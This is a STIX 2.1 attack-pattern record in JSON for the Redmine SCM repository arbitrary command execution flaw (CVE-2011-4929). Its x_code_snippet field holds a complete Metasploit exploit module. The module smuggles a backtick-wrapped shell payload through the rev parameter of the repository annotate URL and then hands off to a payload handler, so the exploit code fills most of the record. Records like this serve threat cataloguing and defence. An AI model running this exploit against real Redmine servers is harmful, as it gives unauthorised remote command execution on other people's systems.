{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aa3d26e6-8ad3-439a-8a9f-d0b7ecc80e01",
    "created": "2024-08-14T17:13:55.856752Z",
    "modified": "2024-08-14T17:13:55.856756Z",
    "name": "Redmine SCM Repository Arbitrary Command Execution",
    "description": " This module exploits an arbitrary command execution vulnerability in the Redmine repository controller. The flaw is triggered when a rev parameter is passed to the command line of the SCM tool without adequate filtering. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/redmine_scm_exec.rb",
            "external_id": "redmine_scm_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4929"
        },
        {
            "source_name": "reference",
            "url": "http://www.redmine.org/news/49"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Redmine SCM Repository Arbitrary Command Execution',\n      'Description'    => %q{\n          This module exploits an arbitrary command execution vulnerability in the\n        Redmine repository controller. The flaw is triggered when a rev parameter\n        is passed to the command line of the SCM tool without adequate filtering.\n      },\n      'Author'         => [ 'joernchen <joernchen[at]phenoelit.de>' ],  #Phenoelit\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2011-4929'],\n          ['OSVDB', '70090'],\n          ['URL', 'http://www.redmine.org/news/49' ]\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 512,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              #'RequiredCmd' => 'generic telnet',\n            }\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2010-12-19',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('URI', [true, \"The full URI path to the project\", \"/projects/1/\"]),\n        ])\n  end\n\n  def exploit\n    command = Rex::Text.uri_encode(payload.encoded)\n    urlconfigdir = normalize_uri(datastore['URI'], \"/repository/annotate\") + \"?rev=`#{command}`\"\n\n    res = send_request_raw({\n      'uri'     => urlconfigdir,\n      'method'  => 'GET',\n      'headers' =>\n      {\n        'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',\n        'Connection' => 'Close',\n      }\n    }, 25)\n\n    if (res)\n      print_status(\"The server returned: #{res.code} #{res.message}\")\n    else\n      print_status(\"No response from the server\")\n    end\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-12-19",
    "x_mitre_platforms": [
        "unix'"
    ]
}